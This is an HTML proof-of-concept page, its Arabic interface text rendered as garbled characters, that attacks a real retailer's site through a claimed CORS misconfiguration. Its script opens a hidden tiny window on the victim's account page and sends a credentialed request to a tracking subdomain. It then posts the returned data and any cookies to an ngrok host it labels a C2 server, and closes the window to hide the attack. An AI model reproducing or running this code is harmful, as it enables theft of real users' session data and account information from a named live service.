<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>ุฅุซุจุงุช ููููู: ุงุณุชุบูุงู ุงูุฌุณุฑ ุงููุงูู (CORS Bridge)</title>
    <style>
        body { font-family: sans-serif; background-color: #121212; color: #00ff00; padding: 50px; text-align: center; }
        .console { background: #000; color: #00ff00; padding: 20px; border: 1px solid #00ff00; text-align: left; height: 300px; overflow-y: auto; font-family: monospace; margin-top: 20px; }
        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #ff0000; color: #fff; border: none; border-radius: 5px; }
        .status { margin-bottom: 10px; font-weight: bold; }
    </style>
</head>
<body>

    <h1>[โ๏ธ] ูุนูู ุงุฎุชุจุงุฑ ุงูุงุฎุชุฑุงู: ุงุณุชุบูุงู STM Bridge</h1>
    <p>ูุฐู ุงูุตูุญุฉ ุณุชุญุงูู ุงุณุชุฎุฏุงู stm.zooplus.com ูุฌุณุฑ ูุณุญุจ ุจูุงูุงุชู ูู zooplus.com</p>
    
    <div class="status" id="status">ุงูุญุงูุฉ: ูู ุงูุชุธุงุฑ ุจุฏุก ุงููุฌูู...</div>
    <button id="startAttack">ุงุจุฏุฃ ุงููุฌูู ุงูุขู</button>

    <div class="console" id="logConsole">
        > ุฌุงูุฒ ููุงุณุชุบูุงู...<br>
    </div>

    <script>
        const logBtn = document.getElementById('startAttack');
        const consoleBox = document.getElementById('logConsole');
        const statusText = document.getElementById('status');
        const EXFIL_URL = "https://subsphenoidal-dauntlessly-pura.ngrok-free.dev/bridge-data";

        function log(msg, color = "#00ff00") {
            const time = new Date().toLocaleTimeString();
            consoleBox.innerHTML += `<span style="color: ${color}">[${time}] ${msg}</span><br>`;
            consoleBox.scrollTop = consoleBox.scrollHeight;
        }

        logBtn.onclick = async function() {
            statusText.innerText = "ุงูุญุงูุฉ: ุฌุงุฑู ุชูููุฐ ุงููุฌูู...";
            log("ุจุฏุก ุงููุฌูู ุนุจุฑ ุงูุฌุณุฑ: stm.zooplus.com", "yellow");

            // 1. ูุชุญ ูุงูุฐุฉ Zooplus ูุถูุงู ุชุญููู ุงูููููุฒ ูู ุงููุชุตูุญ
            log("ูุชุญ ูุงูุฐุฉ Zooplus ูู ุงูุฎูููุฉ...");
            const vWin = window.open("https://www.zooplus.com/account/overview", "victim", "width=1,height=1,left=10000");

            // ููุชุธุฑ ููููุงู ูุถูุงู ุชุญููู ุงููุชุตูุญ ููููููุฒ
            log("ุงูุชุธุงุฑ ุชุฒุงูู ุงูุฌูุณุฉ (3 ุซูุงูู)...", "cyan");
            setTimeout(async () => {
                
                // 2. ูุญุงููุฉ ุงุณุชุบูุงู ุงูุฌุณุฑ (CORS Misconfiguration)
                // ูุฐุง ุงูุทูุจ ุณูุญูู ูุนู ููููุฒ .zooplus.com ุชููุงุฆูุงู ุจุณุจุจ credentials: include
                log("ูุญุงููุฉ ุณุญุจ ุงูุจูุงูุงุช ุนุจุฑ ุงูุฌุณุฑ STM...");
                
                try {
                    const response = await fetch('https://stm.zooplus.com/g/collect?v=2&tid=G-WQGMZ03HML&en=page_view&_s=1', {
                        method: 'GET',
                        mode: 'cors',
                        credentials: 'include'
                    });

                    // ุฅุฐุง ูุงู ุงูุฑุฏ OKุ ููุฐุง ูุนูู ุฃู ุงูุฌุณุฑ ุณูุญ ููุง ุจุงูุฏุฎูู
                    if (response.ok) {
                        const data = await response.text();
                        log("โ ูุฌุงุญ! ุชู ุงุฎุชุฑุงู ุงูุฌุณุฑ ูุงุณุชูุงู ุงูุจูุงูุงุช.", "red");
                        
                        // 3. ุฅุฑุณุงู ุงูุจูุงูุงุช "ุงููุณุฑููุฉ" ุฅูู ุณูุฑูุฑ ุงูููุงุฌู (Ngrok)
                        await fetch(EXFIL_URL, {
                            method: "POST",
                            mode: "no-cors",
                            body: JSON.stringify({
                                info: "Data captured via stm bridge",
                                payload: data,
                                // ููุง ูุญุงูู ุฑุตุฏ ุฃู Set-Cookie ูู ุงูุฑุฏ ุฅุฐุง ูุงู ุงูุณูุฑูุฑ ูุนูุณูุง
                                cookies_leaked: response.headers.get('Set-Cookie')
                            })
                        });
                        log("๐ ุชู ุฅุฑุณุงู ุงูุจูุงูุงุช ุฅูู C2 Server (Ngrok) ุจูุฌุงุญ.");
                        statusText.innerText = "ุงูุญุงูุฉ: ุชู ุฅุฑุณุงู ุงูุจูุงูุงุช ุจูุฌุงุญ!";
                    } else {
                        log("โ ูุดู ุงูุฌุณุฑ ูู ุงูุฑุฏ ุจุงูุจูุงูุงุช ุงููุทููุจุฉ.", "orange");
                    }
                } catch (err) {
                    log("โ ุฎุทุฃ CORS: ุงูุฌุณุฑ ุฑูุถ ุงูุทูุจ ุฃู ุงููุทุงู ุบูุฑ ูุตุฑุญ ุจู.", "orange");
                    console.error(err);
                }

                // ุฅุบูุงู ุงููุงูุฐุฉ ุงูููุจุซูุฉ ูุฅุฎูุงุก ุงูุฃุซุฑ
                if(vWin) vWin.close();
                log("ุชู ุฅุฎูุงุก ุฃุซุฑ ุงููุฌูู.");
            }, 3000);
        };
    </script>
</body>
</html>
